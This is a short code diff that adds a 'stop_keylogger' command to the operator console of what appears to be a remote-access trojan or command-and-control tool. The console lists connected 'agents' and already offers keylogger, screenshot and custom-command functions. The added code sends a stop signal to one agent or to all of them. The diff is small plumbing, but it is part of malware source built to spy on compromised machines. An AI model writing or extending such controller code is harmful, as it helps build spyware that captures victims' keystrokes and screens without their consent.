@@ -167,6 +167,31 @@ def terminal(args):
         except (ValueError, IndexError):
             logger.error("Invalid selection.")
 
+    def stop_keylogger_command():
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
+        
+        try:
+            choice = input("Select agent number (or 'all' for all agents): ").strip()
+            if choice.lower() == 'all':
+                for agent in agents:
+                    agent_tool.send_str(agent, "STOP_KEYLOGGER")
+                    logger.info(f"Keylogger command sent to {agent.addr}")
+            else:
+                selected_agent = agents[int(choice) - 1]
+                agent_tool.send_str(selected_agent, "STOP_KEYLOGGER")
+                logger.info(f"Keylogger command sent to {selected_agent.addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
+
+
     def screenshot_command():
         agents = agent_tool.get_agents()
         if not agents:
@@ -220,6 +245,7 @@ def terminal(args):
         "help": help_command,
         "agents": list_agents_command,
         "keylogger": keylogger_command,
+        "stop_keylogger": stop_keylogger_command,
         "screenshot": screenshot_command,
         "send": send_custom_command,
         "exit": exit_command,
